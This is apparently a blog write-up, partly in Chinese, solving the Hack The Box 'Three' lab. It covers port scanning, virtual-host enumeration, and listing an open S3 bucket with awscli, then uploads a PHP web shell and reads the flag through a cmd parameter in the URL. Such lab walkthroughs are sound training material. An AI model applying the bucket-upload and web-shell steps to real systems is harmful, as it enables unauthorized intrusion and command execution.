---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Three"
uuid: c18c3302-3314-11ed-a39a-327ebed86db8
version: 286
created: Tue, 13 Sep 2022 03:32:54 GMT
tags: [ "type/resource", "status/draft", "areas/pentest" ]
---

**TASK 1**

**How many TCP ports are open?** 2

```
$ nmap -sC -sT -sV $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 06:53 BST
Nmap scan report for 10.129.218.174
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.12 seconds
```

**TASK 2**

**What is the domain of the email address provided in the "Contact" section of the website?** thetoppers.htb

**TASK 3**

**In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?** /etc/hosts

**TASK 4**

**Which sub-domain is discovered during further enumeration?** s3.thetoppers.htb

将thetoppers.htb映射ip，写入到hosts文件中

开始爆破子域名

`ffuf -u http://PARAM.thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-200000.txt:PARAM`

试了多个字典，都扫不出来

使用gobuster dns模式也扫不出来

使用gobuster vhost命令, 可以扫出来2个

返回码404和400，，所以没扫出来

![](https://images.amplenote.com/c18c3302-3314-11ed-a39a-327ebed86db8/6d5f001f-d98e-4fb5-bded-d3fe43052db5.png)

**TASK 5**

**Which service is running on the discovered sub-domain?** Amazon S3

**TASK 6**

**Which command line utility can be used to interact with the service running on the discovered sub-domain?** awscli

**TASK 7**

**Which command is used to set up the AWS CLI installation?** aws configure

**TASK 8**

**What is the command used by the above utility to list all of the S3 buckets?** aws s3 ls

**TASK 9**

**This server is configured to run files written in what web scripting language?** PHP

**SUBMIT FLAG** 

将s3.thetoppers.htb也添加到hosts文件中

`10.129.230.68 thetoppers.htb s3.thetoppers.htb`

根据[aws文档](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)，安装awscli

然后需要配置aws，随便输：`aws configure`

根据[aws文档](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets)可得以下命令: `aws s3 ls s3://thetoppers.htb`

但报错了：

![](https://images.amplenote.com/c18c3302-3314-11ed-a39a-327ebed86db8/ca9b0d9d-fda3-4850-9719-8f487d6aa3c1.png)

通过错误信息可知，需要修改endpoint URL，根据[文档](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/ls.html)可知参数为--endpoint-url

![](https://images.amplenote.com/c18c3302-3314-11ed-a39a-327ebed86db8/7161e1d1-c1a9-4b41-841c-74ebae27b251.png)

那么接下来就是上传后门文件咯

![](https://images.amplenote.com/c18c3302-3314-11ed-a39a-327ebed86db8/77d27b99-531c-4b52-a8a9-c6a35433c880.png)

然后通过[url在线编码器](https://www.w3cschool.cn/tools/index?name=urlencode_decode)，编码命令就能得到flag了

http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt

**Note:**

ref: 

字典(dict) [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) 

[Configuration basics - AWS Command Line Interface (amazon.com)](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html) 

[https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/)  [Note](https://www.amplenote.com/notes/876fd216-33df-11ed-a709-5ac3aea65f93) 